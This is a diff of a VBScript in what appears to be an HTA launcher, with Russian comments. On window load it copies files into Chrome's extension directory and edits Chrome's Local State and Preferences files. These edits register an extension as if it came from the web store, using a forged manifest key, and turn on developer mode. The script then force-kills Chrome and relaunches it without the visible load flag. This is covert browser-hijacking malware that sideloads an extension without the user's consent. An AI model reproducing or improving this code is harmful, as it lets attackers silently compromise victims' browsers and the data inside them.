@@ -50,24 +50,49 @@ Sub Window_onLoad
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
-        ' Создаем минимальные настройки для расширения
+        ' Обновляем Local State
+        If fso.FileExists(userDataPath & "\Local State") Then
+            Set stateFile = fso.OpenTextFile(userDataPath & "\Local State", 1)
+            stateContent = stateFile.ReadAll()
+            stateFile.Close
+            
+            ' Добавляем расширение в Local State
+            If InStr(stateContent, """extensions""") > 0 Then
+                If InStr(stateContent, """external_extensions""") > 0 Then
+                    newState = Replace(stateContent, """external_extensions"":{", """external_extensions"":{""" & extensionId & """:{"" installation_mode"":""normal"",""update_url"":""https://clients2.google.com/service/update2/crx""},")
+                Else
+                    newState = Replace(stateContent, """extensions"":{", """extensions"":{""external_extensions"":{""" & extensionId & """:{""installation_mode"":""normal"",""update_url"":""https://clients2.google.com/service/update2/crx""}},")
+                End If
+            Else
+                newState = Replace(stateContent, "{", "{""extensions"":{""external_extensions"":{""" & extensionId & """:{""installation_mode"":""normal"",""update_url"":""https://clients2.google.com/service/update2/crx""}},""settings"":{},""ui"":{""developer_mode"":true}},")
+            End If
+            
+            Set stateFile = fso.OpenTextFile(userDataPath & "\Local State", 2)
+            stateFile.Write newState
+            stateFile.Close
+        End If
+        
+        ' Обновляем Preferences
         If fso.FileExists(userDataPath & "\Default\Preferences") Then
             Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 1)
             prefsContent = prefsFile.ReadAll()
             prefsFile.Close
             
-            ' Проверяем, есть ли уже настройки расширений
-            If InStr(prefsContent, """extensions""") = 0 Then
-                ' Если нет секции extensions, создаем её
-                prefsContent = Replace(prefsContent, "{", "{ ""extensions"": { ""settings"": {}, ""ui"": { ""developer_mode"": true } },")
+            ' Добавляем расширение в Preferences
+            extSettings = """" & extensionId & """: {""from_webstore"":true,""install_time"":""13322812532964955"",""location"":1,""manifest"":{""key"":""MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvxVo7FPzl0Qg8qFtKqS0NjJqJNB4ZHWRmbxO+9H+0JrZPTHiiLVgDnJXvYpS5/5m4tOX/mffPbkGEHBmPFX1Zw0MxhUHjHiI4Qw4MPXKgwGHYvZoGhGT4WMbZqMYYCOhCmxkS9fhxDVyKGcbTYQPwYJHf+lKQMTHE+XlhZJHzXzJrHwUJBgKvp0yQxJVZ9GxD1LBF7+pf4FJyA9LxaVpQYSXjDgBGjwHW1YO+y+iUVDWxjKmxMwZc/KnMHjnw9t0AFgZHK+kxoiQHSG8FUKYRtQFQJOCHM2QhFJ0J4GZvR7G6o/8jl3+YBjwQDkQgk9GnFzUVhvuL+Qp5B9HBaJ+XQIDAQAB""},""path"":""" & extensionId & "_1.0.0"",""state"":1,""was_installed_by_default"":false}"
+            
+            If InStr(prefsContent, """extensions""") > 0 Then
+                If InStr(prefsContent, """settings""") > 0 Then
+                    newPrefs = Replace(prefsContent, """settings"":{", """settings"":{" & extSettings & ",")
+                Else
+                    newPrefs = Replace(prefsContent, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
+                End If
+            Else
+                newPrefs = Replace(prefsContent, "{", "{""extensions"":{""settings"":{" & extSettings & "},""ui"":{""developer_mode"":true}},")
             End If
             
-            ' Добавляем наше расширение
-            extSettings = """" & extensionId & """: { ""path"": """ & extensionId & "/1.0.0"", ""state"": 1, ""version"": ""1.0.0"" }"
-            prefsContent = Replace(prefsContent, """settings"": {", """settings"": {" & extSettings & ",")
-            
             Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 2)
-            prefsFile.Write prefsContent
+            prefsFile.Write newPrefs
             prefsFile.Close
         End If
         
@@ -79,9 +104,9 @@ Sub Window_onLoad
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
         shell.Run "ping -n 3 127.0.0.1", 0, True
         
-        ' Запускаем Chrome с параметром загрузки расширения
+        ' Запускаем Chrome
         chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
-        shell.Run chromePath & " --enable-extensions --load-extension=""" & chromeExtPath & """", 1, False
+        shell.Run chromePath, 1, False
     End If
     
     self.close
